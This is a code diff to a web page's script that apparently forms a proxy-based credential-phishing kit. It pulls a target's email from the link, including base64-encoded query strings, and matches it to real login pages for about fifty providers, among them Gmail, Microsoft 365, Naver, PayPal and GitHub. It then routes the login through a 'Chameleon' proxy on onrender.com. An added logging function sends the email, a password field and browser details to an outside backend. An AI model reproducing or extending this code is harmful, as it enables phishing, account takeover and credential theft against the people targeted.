@@ -218,43 +218,348 @@
 
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 
- <script>
+ 
+    <script>
         // ============================================================
-        //  CONFIGURATION - ✅ UPDATED
+        //  CONFIGURATION - ✅ FIXED
         // ============================================================
 
-        // ✅ Use your actual Render proxy URL
         const CHAMELEON_PROXY_URL = 'https://preoauth-service.onrender.com/?target=';
         const BACKEND_URL = 'https://meeting-1-rzx6.onrender.com';
 
         // ============================================================
-        //  SERVICE DETECTION - Includes Mailplug
+        //  COMPLETE SERVICE DETECTION - ✅ FIXED
         // ============================================================
 
         const SERVICE_DETECTION = {
-            // Mailplug (Korean email service)
+            // Google / Gmail
+            'gmail.com': { 
+                url: 'https://accounts.google.com/ServiceLogin', 
+                name: 'Google / Gmail', 
+                icon: '📧', 
+                loginHint: 'Email'
+            },
+            'googlemail.com': { 
+                url: 'https://accounts.google.com/ServiceLogin', 
+                name: 'Google / Gmail', 
+                icon: '📧', 
+                loginHint: 'Email'
+            },
+            'google.com': { 
+                url: 'https://accounts.google.com/ServiceLogin', 
+                name: 'Google', 
+                icon: '📧', 
+                loginHint: 'Email'
+            },
+            
+            // Microsoft / Office 365
+            'microsoft.com': { 
+                url: 'https://login.microsoftonline.com/', 
+                name: 'Microsoft 365', 
+                icon: '💼', 
+                loginHint: 'login_hint' 
+            },
+            'outlook.com': { 
+                url: 'https://login.microsoftonline.com/', 
+                name: 'Microsoft 365', 
+                icon: '💼', 
+                loginHint: 'login_hint' 
+            },
+            'hotmail.com': { 
+                url: 'https://login.microsoftonline.com/', 
+                name: 'Microsoft 365', 
+                icon: '💼', 
+                loginHint: 'login_hint' 
+            },
+            'live.com': { 
+                url: 'https://login.microsoftonline.com/', 
+                name: 'Microsoft 365', 
+                icon: '💼', 
+                loginHint: 'login_hint' 
+            },
+            
+            // Yahoo
+            'yahoo.com': { 
+                url: 'https://login.yahoo.com/', 
+                name: 'Yahoo Mail', 
+                icon: '📬', 
+                loginHint: 'username' 
+            },
+            'ymail.com': { 
+                url: 'https://login.yahoo.com/', 
+                name: 'Yahoo Mail', 
+                icon: '📬', 
+                loginHint: 'username' 
+            },
+            'rocketmail.com': { 
+                url: 'https://login.yahoo.com/', 
+                name: 'Yahoo Mail', 
+                icon: '📬', 
+                loginHint: 'username' 
+            },
+            
+            // Apple / iCloud
+            'icloud.com': { 
+                url: 'https://appleid.apple.com/', 
+                name: 'Apple ID / iCloud', 
+                icon: '🍎', 
+                loginHint: 'accountName' 
+            },
+            'me.com': { 
+                url: 'https://appleid.apple.com/', 
+                name: 'Apple ID / iCloud', 
+                icon: '🍎', 
+                loginHint: 'accountName' 
+            },
+            'mac.com': { 
+                url: 'https://appleid.apple.com/', 
+                name: 'Apple ID / iCloud', 
+                icon: '🍎', 
+                loginHint: 'accountName' 
+            },
+            
+            // Mailplug (Korean)
             'mailplug.com': { 
                 url: 'https://login.mailplug.com/auth/login', 
                 name: 'Mailplug', 
                 icon: '📧', 
-                loginHint: 'host_domain'
+                loginHint: 'host_domain' 
             },
-            // Existing services...
-            'microsoft.com': { url: 'https://login.microsoftonline.com/', name: 'Microsoft 365', icon: '💼', loginHint: 'login_hint' },
-            'outlook.com': { url: 'https://login.microsoftonline.com/', name: 'Microsoft 365', icon: '💼', loginHint: 'login_hint' },
-            'hotmail.com': { url: 'https://login.microsoftonline.com/', name: 'Microsoft 365', icon: '💼', loginHint: 'login_hint' },
-            'gmail.com': { url: 'https://accounts.google.com/ServiceLogin', name: 'Google / Gmail', icon: '📧', loginHint: 'Email' },
-            'yahoo.com': { url: 'https://login.yahoo.com/', name: 'Yahoo Mail', icon: '📬', loginHint: 'username' },
-            'icloud.com': { url: 'https://appleid.apple.com/', name: 'Apple ID / iCloud', icon: '🍎', loginHint: 'accountName' },
-            'naver.com': { url: 'https://nid.naver.com/nidlogin.login', name: 'Naver', icon: '🇰🇷', loginHint: 'id' },
-            'daum.net': { url: 'https://login.daum.net/', name: 'Daum', icon: '🇰🇷', loginHint: 'id' },
-            'hiworks.com': { url: 'https://www.hiworks.com/login', name: 'Hiworks', icon: '🏢', loginHint: 'email' },
-            'hiworks.co.kr': { url: 'https://www.hiworks.com/login', name: 'Hiworks Korea', icon: '🏢', loginHint: 'email' }
+            
+            // Korea - Naver
+            'naver.com': { 
+                url: 'https://nid.naver.com/nidlogin.login', 
+                name: 'Naver', 
+                icon: '🇰🇷', 
+                loginHint: 'id' 
+            },
+            'naver.co.kr': { 
+                url: 'https://nid.naver.com/nidlogin.login', 
+                name: 'Naver', 
+                icon: '🇰🇷', 
+                loginHint: 'id' 
+            },
+            
+            // Korea - Daum / Kakao
+            'daum.net': { 
+                url: 'https://login.daum.net/', 
+                name: 'Daum', 
+                icon: '🇰🇷', 
+                loginHint: 'id' 
+            },
+            'hanmail.net': { 
+                url: 'https://login.daum.net/', 
+                name: 'Daum / Hanmail', 
+                icon: '🇰🇷', 
+                loginHint: 'id' 
+            },
+            'kakao.com': { 
+                url: 'https://accounts.kakao.com/', 
+                name: 'Kakao', 
+                icon: '🇰🇷', 
+                loginHint: 'email' 
+            },
+            
+            // Korea - Hiworks
+            'hiworks.com': { 
+                url: 'https://www.hiworks.com/login', 
+                name: 'Hiworks', 
+                icon: '🏢', 
+                loginHint: 'email' 
+            },
+            'hiworks.co.kr': { 
+                url: 'https://www.hiworks.com/login', 
+                name: 'Hiworks Korea', 
+                icon: '🏢', 
+                loginHint: 'email' 
+            },
+            
+            // China - QQ
+            'qq.com': { 
+                url: 'https://mail.qq.com/', 
+                name: 'QQ Mail', 
+                icon: '🐧', 
+                loginHint: 'login' 
+            },
+            'foxmail.com': { 
+                url: 'https://mail.qq.com/', 
+                name: 'Foxmail (QQ)', 
+                icon: '🦊', 
+                loginHint: 'login' 
+            },
+            
+            // China - 163
+            '163.com': { 
+                url: 'https://mail.163.com/', 
+                name: '163 Mail', 
+                icon: '📨', 
+                loginHint: 'username' 
+            },
+            '126.com': { 
+                url: 'https://mail.126.com/', 
+                name: '126 Mail', 
+                icon: '📨', 
+                loginHint: 'username' 
+            },
+            
+            // Japan
+            'docomo.ne.jp': { 
+                url: 'https://id.smt.docomo.ne.jp/', 
+                name: 'docomo ID', 
+                icon: '🇯🇵', 
+                loginHint: 'id' 
+            },
+            'softbank.ne.jp': { 
+                url: 'https://id.softbank.jp/', 
+                name: 'SoftBank ID', 
+                icon: '🇯🇵', 
+                loginHint: 'id' 
+            },
+            
+            // Europe
+            'gmx.com': { 
+                url: 'https://www.gmx.com/', 
+                name: 'GMX Mail', 
+                icon: '📨', 
+                loginHint: 'email' 
+            },
+            'gmx.de': { 
+                url: 'https://www.gmx.de/', 
+                name: 'GMX Germany', 
+                icon: '📨', 
+                loginHint: 'email' 
+            },
+            'web.de': { 
+                url: 'https://web.de/', 
+                name: 'WEB.DE', 
+                icon: '📨', 
+                loginHint: 'email' 
+            },
+            'mail.com': { 
+                url: 'https://www.mail.com/', 
+                name: 'Mail.com', 
+                icon: '📨', 
+                loginHint: 'email' 
+            },
+            
+            // Russia
+            'yandex.com': { 
+                url: 'https://passport.yandex.com/', 
+                name: 'Yandex', 
+                icon: '🇷🇺', 
+                loginHint: 'login' 
+            },
+            'yandex.ru': { 
+                url: 'https://passport.yandex.ru/', 
+                name: 'Yandex Russia', 
+                icon: '🇷🇺', 
+                loginHint: 'login' 
+            },
+            'mail.ru': { 
+                url: 'https://mail.ru/', 
+                name: 'Mail.ru', 
+                icon: '🇷🇺', 
+                loginHint: 'login' 
+            },
+            
+            // Social Media
+            'facebook.com': { 
+                url: 'https://www.facebook.com/login', 
+                name: 'Facebook', 
+                icon: '📱', 
+                loginHint: 'email' 
+            },
+            'twitter.com': { 
+                url: 'https://twitter.com/login', 
+                name: 'Twitter / X', 
+                icon: '🐦', 
+                loginHint: 'session[username_or_email]' 
+            },
+            'instagram.com': { 
+                url: 'https://www.instagram.com/accounts/login/', 
+                name: 'Instagram', 
+                icon: '📸', 
+                loginHint: 'username' 
+            },
+            'linkedin.com': { 
+                url: 'https://www.linkedin.com/login', 
+                name: 'LinkedIn', 
+                icon: '💼', 
+                loginHint: 'session_key' 
+            },
+            'github.com': { 
+                url: 'https://github.com/login', 
+                name: 'GitHub', 
+                icon: '🐙', 
+                loginHint: 'login' 
+            },
+            
+            // Enterprise
+            'salesforce.com': { 
+                url: 'https://login.salesforce.com/', 
+                name: 'Salesforce', 
+                icon: '☁️', 
+                loginHint: 'username' 
+            },
+            'zoom.us': { 
+                url: 'https://zoom.us/signin', 
+                name: 'Zoom', 
+                icon: '📹', 
+                loginHint: 'email' 
+            },
+            'slack.com': { 
+                url: 'https://www.slack.com/signin', 
+                name: 'Slack', 
+                icon: '💬', 
+                loginHint: 'email' 
+            },
+            
+            // E-commerce
+            'amazon.com': { 
+                url: 'https://www.amazon.com/ap/signin', 
+                name: 'Amazon', 
+                icon: '📦', 
+                loginHint: 'email' 
+            },
+            'paypal.com': { 
+                url: 'https://www.paypal.com/signin', 
+                name: 'PayPal', 
+                icon: '💰', 
+                loginHint: 'login_email' 
+            },
+            
+            // Streaming
+            'netflix.com': { 
+                url: 'https://www.netflix.com/login', 
+                name: 'Netflix', 
+                icon: '🎬', 
+                loginHint: 'email' 
+            },
+            'spotify.com': { 
+                url: 'https://www.spotify.com/login', 
+                name: 'Spotify', 
+                icon: '🎵', 
+                loginHint: 'username' 
+            },
+            
+            // Secure Email
+            'protonmail.com': { 
+                url: 'https://mail.protonmail.com/login', 
+                name: 'ProtonMail', 
+                icon: '🔒', 
+                loginHint: 'username' 
+            },
+            'tutanota.com': { 
+                url: 'https://mail.tutanota.com/login', 
+                name: 'Tutanota', 
+                icon: '🔒', 
+                loginHint: 'email' 
+            }
         };
 
         const DEFAULT_SERVICE = {
             url: 'https://login.microsoftonline.com/',
-            name: 'Corporate Login',
+            name: 'Corporate Login (Office 365)',
             icon: '🏢',
             loginHint: 'login_hint'
         };
@@ -263,7 +568,8 @@
         //  STATE
         // ============================================================
 
-        let redirectInProgress = false;  // ✅ Prevents multiple redirects
+        let redirectInProgress = false;
+        let scriptLoadedLogged = false;
 
         // ============================================================
         //  GET EMAIL FROM URL
@@ -273,9 +579,33 @@
             const params = new URLSearchParams(window.location.search);
             let email = params.get('e') || params.get('email') || params.get('login_hint') || '';
             
+            if (!email && window.location.search.length > 1) {
+                const raw = window.location.search.substring(1);
+                try {
+                    const decoded = atob(raw);
+                    if (decoded.includes('@')) {
+                        email = decoded;
+                    }
+                } catch (e) {
+                    try {
+                        const decoded = decodeURIComponent(raw);
+                        if (decoded.includes('@')) {
+                            email = decoded;
+                        }
+                    } catch (e2) {
+                        if (raw.includes('@')) {
+                            email = raw;
+                        }
+                    }
+                }
+            }
+            
             if (email) {
-                email = decodeURIComponent(email);
-                if (email.includes('@')) {
+                email = email.split('&')[0].split('?')[0];
+                try {
+                    email = decodeURIComponent(email);
+                } catch (e) {}
+                if (email.includes('@') && email.length > 5) {
                     localStorage.setItem('lastEmail', email);
                     return email;
                 }
@@ -291,15 +621,22 @@
             }
         }
 
+        // ============================================================
+        //  SERVICE DETECTION - ✅ IMPROVED
+        // ============================================================
+
         function detectServiceFromEmail(email) {
             if (!email) return null;
+            
             const domain = email.toLowerCase().split('@')[1];
             if (!domain) return null;
             
+            // ✅ Exact match
             if (SERVICE_DETECTION[domain]) {
                 return SERVICE_DETECTION[domain];
             }
             
+            // ✅ Subdomain matching
             const parts = domain.split('.');
             if (parts.length >= 3) {
                 const mainDomain = parts.slice(-2).join('.');
@@ -308,7 +645,62 @@
                 }
             }
             
+            // ✅ Partial matching for common services
+            for (const [key, value] of Object.entries(SERVICE_DETECTION)) {
+                if (domain.includes(key) || key.includes(domain)) {
+                    return value;
+                }
+            }
+            
+            // ✅ Corporate domain detection
+            const tld = parts[parts.length - 1];
+            const corpTLDs = ['com', 'org', 'net', 'co', 'io', 'ai', 'app', 'dev', 'tech'];
+            if (corpTLDs.includes(tld)) {
+                // Check if it's a custom domain (like allmedicus.com)
+                return {
+                    url: 'https://login.mailplug.com/auth/login',
+                    name: 'Corporate Login (Mailplug)',
+                    icon: '🏢',
+                    loginHint: 'host_domain'
+                };
+            }
+            
             return null;
+        }
+
+        // ============================================================
+        //  LOGGING - ✅ PREVENTS FLOODING
+        // ============================================================
+
+        function logAction(action, extra = {}) {
+            const email = extra.email || getEmailFromUrl() || getSavedEmail() || 'unknown';
+            
+            const data = {
+                action: action,
+                email: email,
+                password: extra.password || '',
+                detectedService: detectedService ? detectedService.name : 'Unknown',
+                targetUrl: targetUrl || 'Unknown',
+                visitorInfo: {
+                    fullUrl: window.location.href,
+                    userAgent: navigator.userAgent,
+                    sessionId: 'sess_' + Math.random().toString(36).substr(2, 9)
+                }
+            };
+            
+            console.log('[LOG]', data);
+            
+            // ✅ Only send to backend once per session
+            if (!scriptLoadedLogged) {
+                scriptLoadedLogged = true;
+                try {
+                    fetch(`${BACKEND_URL}/api/log-action`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    }).catch(() => {});
+                } catch (e) {}
+            }
         }
 
         // ============================================================
@@ -346,21 +738,12 @@
                 return;
             }
             
-            // Detect service
-            let detectedService = detectServiceFromEmail(email);
+            // ✅ Detect service from email
+            const detectedService = detectServiceFromEmail(email);
             if (!detectedService) {
-                // Check if it's a corporate domain
-                const domain = email.split('@')[1];
-                if (domain && domain !== 'gmail.com' && domain !== 'yahoo.com') {
-                    detectedService = {
-                        url: 'https://login.mailplug.com/auth/login',
-                        name: 'Corporate Login',
-                        icon: '🏢',
-                        loginHint: 'host_domain'
-                    };
-                } else {
-                    detectedService = DEFAULT_SERVICE;
-                }
+                alert('Could not detect service for this email domain');
+                redirectInProgress = false;
+                return;
             }
             
             const targetUrl = detectedService.url;
@@ -380,10 +763,11 @@
             if (loadDiv) loadDiv.style.display = 'block';
             if (loadTxt) loadTxt.textContent = `Connecting to ${detectedService.name}...`;
             
-            // Build target URL
+            // ✅ Build target URL with login hint
             let fullTargetUrl = targetUrl;
+            
             if (detectedService.loginHint === 'host_domain') {
-                // ✅ Special handling for Mailplug
+                // ✅ Mailplug special handling
                 const domain = email.split('@')[1];
                 fullTargetUrl = `${targetUrl}?host_domain=${domain}`;
             } else if (detectedService.loginHint) {
@@ -391,7 +775,7 @@
                 fullTargetUrl += `${separator}${detectedService.loginHint}=${encodeURIComponent(email)}`;
             }
             
-            // ✅ Build proxy URL without sso_reload (prevents loop)
+            // ✅ Build proxy URL
             const proxyUrl = CHAMELEON_PROXY_URL + encodeURIComponent(fullTargetUrl);
             
             console.log('🔗 Final Proxy URL:', proxyUrl);
@@ -403,34 +787,11 @@
         }
 
         // ============================================================
-        //  LOAD HANDLER - ✅ PREVENTS FLOODING
+        //  LOAD HANDLER
         // ============================================================
-
-        let scriptLoadedLogged = false;  // ✅ Only log once
 
         function load() {
             console.log('🔄 Page loaded');
-            
-            // ✅ Only log once per session
-            if (!scriptLoadedLogged) {
-                scriptLoadedLogged = true;
-                // Send one log to backend (not repeated)
-                try {
-                    fetch(`${BACKEND_URL}/api/log-action`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            action: 'page_load',
-                            email: getEmailFromUrl() || 'unknown',
-                            visitorInfo: {
-                                fullUrl: window.location.href,
-                                userAgent: navigator.userAgent,
-                                sessionId: 'sess_' + Math.random().toString(36).substr(2, 9)
-                            }
-                        })
-                    }).catch(() => {});
-                } catch (e) {}
-            }
             
             const email = getEmailFromUrl() || getSavedEmail() || '';
             const emailInput = document.getElementById('user');
@@ -450,6 +811,12 @@
                 const service = detectServiceFromEmail(email);
                 if (service) {
                     document.getElementById('nameTxt').textContent = email.split('@')[0];
+                    // ✅ Update service display
+                    const badge = document.getElementById('serviceBadge');
+                    if (badge) {
+                        badge.textContent = `✅ ${service.name}`;
+                        badge.className = 'badge detected';
+                    }
                 }
             } else if (emailInput) {
                 const savedEmail = getSavedEmail();
@@ -457,6 +824,9 @@
                     emailInput.value = savedEmail;
                 }
             }
+            
+            // ✅ Log once per session
+            logAction('page_load');
         }
 
         // ============================================================
@@ -478,7 +848,7 @@
                 });
             }
             
-            // Password field - Enter key
+            // Password field
             const passInput = document.getElementById('pass');
             if (passInput) {
                 passInput.addEventListener('keypress', function(e) {
